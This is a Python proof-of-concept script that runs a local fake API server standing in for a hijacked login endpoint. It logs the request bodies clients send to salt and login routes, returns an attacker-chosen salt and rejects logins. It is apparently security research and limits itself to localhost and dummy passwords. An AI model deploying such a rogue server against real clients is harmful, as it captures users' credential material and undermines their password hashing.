#!/usr/bin/env python3
"""W37b auth-flow probe — stands in for the hijacked regionBaseURL.

Records exactly what the client sends to /getSalt.php and /doLogin.php so we can
tell whether the password (or a password-equivalent) reaches a malicious API
server, and whether the server gets to choose the salt.

ONLY to be exercised with a deliberately WRONG dummy password.
E-mail addresses are masked in the console output; the raw log stays local.
"""
import sys, os, re, json, base64
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from datetime import datetime

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8099
HERE = os.path.dirname(os.path.abspath(__file__))
LOG = os.path.join(HERE, "auth.log")

EMAIL = re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+")


def mask(s):
    return EMAIL.sub(lambda m: m.group()[:3] + "***@***", s)


def note(msg, console=True):
    line = f"{datetime.now():%H:%M:%S.%f}  {msg}\n"
    with open(LOG, "a", encoding="utf-8") as f:
        f.write(line)
    if console:
        print(mask(line), end="", flush=True)


# a salt WE choose — if the client accepts it, the server controls the salt
ATTACKER_SALT = base64.b64encode(b"ATTACKER-CHOSEN-SALT-0123456789AB").decode()


class H(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _json(self, obj, code=200):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read(self):
        n = int(self.headers.get("Content-Length") or 0)
        return self.rfile.read(n) if n else b""

    def _handle(self, verb):
        raw = self._read()
        try:
            txt = raw.decode("utf-8")
        except UnicodeDecodeError:
            txt = repr(raw)
        note(f"=== {verb} {self.path} ({len(raw)} bytes) ===")
        note(f"    ctype: {self.headers.get('Content-Type','?')}")
        if txt.strip():
            note("    body:\n" + "\n".join("      " + l for l in txt.splitlines()[:60]))

        p = self.path.lower()
        if "getsalt" in p:
            note("    >>> replying with an ATTACKER-CHOSEN salt <<<")
            self._json({"salt": ATTACKER_SALT, "status": 200, "result": "success",
                        "iterations": 1000, "version": 1})
        elif "dologin" in p:
            self._json({"status": 401, "result": "failure",
                        "message": "PoC server - login intentionally rejected"})
        elif "getnetworkconfig" in p or "openidconnect" in p:
            note("    >>> client is asking the ATTACKER for network/SSO config <<<")
            self._json({"status": 200, "result": "success"})
        else:
            self._json({"status": 200, "result": "success"})

    def do_GET(self):
        self._handle("GET")

    def do_POST(self):
        self._handle("POST")

    def do_PUT(self):
        self._handle("PUT")

    def log_message(self, *a):
        pass


note(f"auth probe up on http://127.0.0.1:{PORT}/")
ThreadingHTTPServer(("127.0.0.1", PORT), H).serve_forever()
